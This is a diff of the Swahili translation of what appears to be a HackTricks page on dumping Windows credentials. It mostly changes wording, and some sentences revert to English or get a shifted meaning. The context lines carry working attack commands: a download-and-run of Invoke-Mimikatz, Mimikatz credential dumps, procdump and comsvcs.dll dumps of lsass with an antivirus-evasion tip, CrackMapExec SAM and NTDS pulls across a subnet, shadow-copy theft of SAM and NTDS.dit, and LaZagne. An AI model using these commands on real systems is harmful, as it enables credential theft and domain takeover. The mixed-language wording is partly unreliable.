@@ -9,8 +9,8 @@ Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" al
 <summary>Support HackTricks</summary>
 
 * Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
-* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za kuiba kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
 {% endhint %}
@@ -37,11 +37,11 @@ IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercont
 Invoke-Mimikatz -DumpCreds #Dump creds from memory
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 ```
-[**Jifunze kuhusu baadhi ya ulinzi wa akidi hapa.**](credentials-protections.md) **Ulinzi huu unaweza kuzuia Mimikatz kutolewa baadhi ya akidi.**
+[**Jifunze kuhusu baadhi ya ulinzi wa akiba hapa.**](credentials-protections.md) **Ulinzi huu unaweza kuzuia Mimikatz kutolewa baadhi ya akiba.**
 
-## Akidi na Meterpreter
+## Akiba na Meterpreter
 
-Tumia [**Kipengele cha Akidi**](https://github.com/carlospolop/MSF-Credentials) **ambacho** nimeunda ili **kutafuta nywila na hash** ndani ya mwathirika.
+Tumia [**Kipengele cha Akiba**](https://github.com/carlospolop/MSF-Credentials) **ambacho** nimeunda ili **kutafuta nywila na hash** ndani ya mwathirika.
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -63,7 +63,7 @@ mimikatz_command -f "lsadump::sam"
 ### Procdump + Mimikatz
 
 Kama **Procdump kutoka** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ni chombo halali cha Microsoft**, hakigunduliwi na Defender.\
-Unaweza kutumia chombo hiki **kudondosha mchakato wa lsass**, **kupakua dump** na **kutoa** **akikazi kwa ndani** kutoka kwa dump.
+Unaweza kutumia chombo hiki **kudondosha mchakato wa lsass**, **kupakua dump** na **kuchambua** **akili za ndani** kutoka kwa dump.
 
 {% code title="Dump lsass" %}
 ```bash
@@ -75,7 +75,7 @@ Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
 {% endcode %}
 
-{% code title="Toa akidi kutoka kwenye dump" %}
+{% code title="Toa akidi kutoka kwa dump" %}
 ```c
 //Load the dump
 mimikatz # sekurlsa::minidump lsass.dmp
@@ -86,14 +86,14 @@ mimikatz # sekurlsa::logonPasswords
 
 Mchakato huu unafanywa kiotomatiki kwa kutumia [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Kumbuka**: Baadhi ya **AV** zinaweza **kubaini** kama **hatari** matumizi ya **procdump.exe kutekeleza lsass.exe**, hii ni kwa sababu wanabaini mfuatano wa **"procdump.exe" na "lsass.exe"**. Hivyo ni **rahisi zaidi** **kupitisha** kama **hoja** **PID** ya lsass.exe kwa procdump **badala ya** jina la **lsass.exe.**
+**Kumbuka**: Baadhi ya **AV** zinaweza **kubaini** kama **mbaya** matumizi ya **procdump.exe kutekeleza lsass.exe**, hii ni kwa sababu wanabaini mfuatano wa **"procdump.exe" na "lsass.exe"**. Hivyo ni **rahisi zaidi** **kupitisha** kama **hoja** **PID** ya lsass.exe kwa procdump **badala ya** jina la **lsass.exe.**
 
-### Kutekeleza lsass kwa kutumia **comsvcs.dll**
+### Kutekeleza lsass na **comsvcs.dll**
 
-DLL inayojulikana kama **comsvcs.dll** iliyopo katika `C:\Windows\System32` inawajibika kwa **kutekeleza kumbukumbu ya mchakato** katika tukio la ajali. DLL hii ina **kazi** inayojulikana kama **`MiniDumpW`**, iliyoundwa kutumika kwa `rundll32.exe`.\
-Ni muhimu kutumia hoja mbili za kwanza, lakini ya tatu imegawanywa katika vipengele vitatu. Kitambulisho cha mchakato kinachotakiwa kutekelezwa kinaunda kipengele cha kwanza, mahali pa faili ya dump inawakilisha cha pili, na kipengele cha tatu ni neno **full**. Hakuna chaguo mbadala.\
-Baada ya kuchambua vipengele hivi vitatu, DLL inahusika katika kuunda faili ya dump na kuhamasisha kumbukumbu ya mchakato ulioainishwa katika faili hii.\
-Matumizi ya **comsvcs.dll** yanawezekana kwa kutekeleza mchakato wa lsass, hivyo kuondoa haja ya kupakia na kutekeleza procdump. Njia hii imeelezwa kwa undani zaidi katika [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
+DLL inayoitwa **comsvcs.dll** iliyopo katika `C:\Windows\System32` inawajibika kwa **kutekeleza kumbukumbu ya mchakato** katika tukio la ajali. DLL hii ina **kazi** inayoitwa **`MiniDumpW`**, iliyoundwa kutumika kwa `rundll32.exe`.\
+Ni muhimu kutumia hoja mbili za kwanza, lakini ya tatu imegawanywa katika vipengele vitatu. Kitambulisho cha mchakato kinachohitajika kutekelezwa kinaunda kipengele cha kwanza, mahali pa faili ya dump inawakilisha cha pili, na kipengele cha tatu ni neno **kamili**. Hakuna chaguo mbadala.\
+Baada ya kuchambua vipengele hivi vitatu, DLL inahusika katika kuunda faili ya dump na kuhamasisha kumbukumbu ya mchakato ulioelezwa katika faili hii.\
+Matumizi ya **comsvcs.dll** yanawezekana kwa kutekeleza mchakato wa lsass, hivyo kuondoa haja ya kupakia na kutekeleza procdump. Njia hii imeelezwa kwa undani katika [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
 
 Amri ifuatayo inatumika kwa utekelezaji:
 ```bash
@@ -133,7 +133,7 @@ PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmod
 
 ## CrackMapExec
 
-### Pata hash za SAM
+### Dumisha SAM hashes
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
@@ -156,7 +156,7 @@ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 ```
 ## Stealing SAM & SYSTEM
 
-Hizi faili zinapaswa **kuwa** katika _C:\windows\system32\config\SAM_ na _C:\windows\system32\config\SYSTEM._ Lakini **huwezi tu kuziandika kwa njia ya kawaida** kwa sababu zimehifadhiwa.
+Hizi faili zinapaswa kuwa **zimewekwa** katika _C:\windows\system32\config\SAM_ na _C:\windows\system32\config\SYSTEM._ Lakini **huwezi tu kuziiga kwa njia ya kawaida** kwa sababu zimehifadhiwa.
 
 ### From Registry
 
@@ -177,7 +177,7 @@ Unaweza kufanya nakala ya faili zilizolindwa ukitumia huduma hii. Unahitaji kuwa
 
 #### Kutumia vssadmin
 
-Faili ya vssadmin inapatikana tu katika toleo za Windows Server
+Faili ya vssadmin inapatikana tu katika toleo za Windows Server.
 ```bash
 vssadmin create shadow /for=C:
 #Copy SAM
@@ -207,12 +207,12 @@ Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c
 ```
 ## **Akida za Active Directory - NTDS.dit**
 
-Faili la **NTDS.dit** linajulikana kama moyo wa **Active Directory**, likihifadhi data muhimu kuhusu vitu vya mtumiaji, vikundi, na uanachama wao. Hapa ndipo **hashes za nywila** za watumiaji wa kikoa zinahifadhiwa. Faili hii ni **Extensible Storage Engine (ESE)** database na inapatikana katika **_%SystemRoom%/NTDS/ntds.dit_**.
+Faili la **NTDS.dit** linajulikana kama moyo wa **Active Directory**, likihifadhi data muhimu kuhusu vitu vya mtumiaji, vikundi, na uanachama wao. Hapa ndipo **hashes za nywila** za watumiaji wa kikoa zinahifadhiwa. Faili hili ni **Extensible Storage Engine (ESE)** database na linapatikana katika **_%SystemRoom%/NTDS/ntds.dit_**.
 
 Katika database hii, meza tatu kuu zinahifadhiwa:
 
-- **Meza ya Data**: Meza hii ina jukumu la kuhifadhi maelezo kuhusu vitu kama watumiaji na vikundi.
-- **Meza ya Kiungo**: Inafuatilia uhusiano, kama vile uanachama wa vikundi.
+- **Meza ya Data**: Meza hii inawajibika kuhifadhi maelezo kuhusu vitu kama watumiaji na vikundi.
+- **Meza ya Link**: Inafuatilia uhusiano, kama vile uanachama wa vikundi.
 - **Meza ya SD**: **Maelezo ya usalama** kwa kila kitu yanashikiliwa hapa, kuhakikisha usalama na udhibiti wa ufikiaji kwa vitu vilivyohifadhiwa.
 
 Taarifa zaidi kuhusu hii: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
@@ -221,13 +221,13 @@ Windows inatumia _Ntdsa.dll_ kuingiliana na faili hiyo na inatumika na _lsass.ex
 
 #### Kufungua hashes ndani ya NTDS.dit
 
-Hash inafichwa mara 3:
+Hash inasimbwa mara 3:
 
 1. Fungua Funguo la Usimbaji wa Nywila (**PEK**) kwa kutumia **BOOTKEY** na **RC4**.
 2. Fungua **hash** kwa kutumia **PEK** na **RC4**.
 3. Fungua **hash** kwa kutumia **DES**.
 
-**PEK** ina **thamani sawa** katika **kila kidhibiti cha kikoa**, lakini inafichwa ndani ya faili ya **NTDS.dit** kwa kutumia **BOOTKEY** ya **faili ya SYSTEM ya kidhibiti cha kikoa (ni tofauti kati ya vidhibiti vya kikoa)**. Hii ndiyo sababu ili kupata akida kutoka kwa faili la NTDS.dit **unahitaji faili NTDS.dit na SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
+**PEK** ina **thamani sawa** katika **kila kidhibiti cha kikoa**, lakini inasimbwa **ndani ya faili la NTDS.dit** kwa kutumia **BOOTKEY** ya **faili ya SYSTEM ya kidhibiti cha kikoa (ni tofauti kati ya vidhibiti vya kikoa)**. Hii ndiyo sababu ili kupata akida kutoka kwa faili la NTDS.dit **unahitaji faili NTDS.dit na SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
 
 ### Nakala ya NTDS.dit kwa kutumia Ntdsutil
 
@@ -257,11 +257,11 @@ Vitu vya NTDS vinaweza kutolewa kwenye hifadhidata ya SQLite kwa kutumia [ntdsdo
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-The `SYSTEM` hive ni hiari lakini inaruhusu ufichuzi wa siri (NT & LM hashes, nyongeza za akidi kama nywila za wazi, funguo za kerberos au imani, historia za nywila za NT & LM). Pamoja na taarifa nyingine, data ifuatayo inachukuliwa: akaunti za mtumiaji na mashine zikiwa na hashes zao, bendera za UAC, alama ya wakati wa kuingia kwa mwisho na mabadiliko ya nywila, maelezo ya akaunti, majina, UPN, SPN, vikundi na uanachama wa kurudi, mti wa vitengo vya shirika na uanachama, maeneo ya kuaminika yenye aina za imani, mwelekeo na sifa...
+The `SYSTEM` hive is optional but allow for secrets decryption (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Along with other information, the following data is extracted : user and machine accounts with their hashes, UAC flags, timestamp for last logon and password change, accounts description, names, UPN, SPN, groups and recursive memberships, organizational units tree and membership, trusted domains with trusts type, direction and attributes...
 
 ## Lazagne
 
-Pakua binary kutoka [hapa](https://github.com/AlessandroZ/LaZagne/releases). unaweza kutumia binary hii kutoa akidi kutoka kwa programu kadhaa.
+Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). unaweza kutumia binary hii kutoa akreditif kutoka kwa programu kadhaa.
 ```
 lazagne.exe all
 ```
@@ -290,7 +290,7 @@ type outpwdump
 
 Pakua kutoka: [ http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) na **tekeleza tu** na nywila zitapatikana.
 
-## Defenses
+## Ulinzi
 
 [**Jifunze kuhusu baadhi ya ulinzi wa akidi hapa.**](credentials-protections.md)
 
@@ -303,7 +303,7 @@ Jifunze & fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt
 <summary>Support HackTricks</summary>
 
 * Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
-* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
